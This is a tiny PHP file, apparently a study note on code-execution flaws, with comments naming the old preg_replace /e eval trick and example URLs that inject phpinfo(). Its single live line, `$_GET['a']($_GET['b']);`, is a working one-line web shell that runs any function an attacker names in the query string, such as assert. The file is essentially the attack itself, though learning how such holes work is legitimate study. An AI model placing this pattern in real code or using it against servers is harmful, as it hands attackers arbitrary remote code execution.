<?php
/**
 * Created by PhpStorm.
 * User: zhangyue
 * Date: 2016/11/8
 * Time: 下午11:05
 */
//可执行
//http://localhost/php/daimashengji/2.php?str=[phpinfo()]
//preg_replace("/\[(.*)\]/e",'\\1',$_GET['str']);

//http://localhost/php/daimashengji/2.php?a=assert&b=phpinfo()
$_GET['a']($_GET['b']);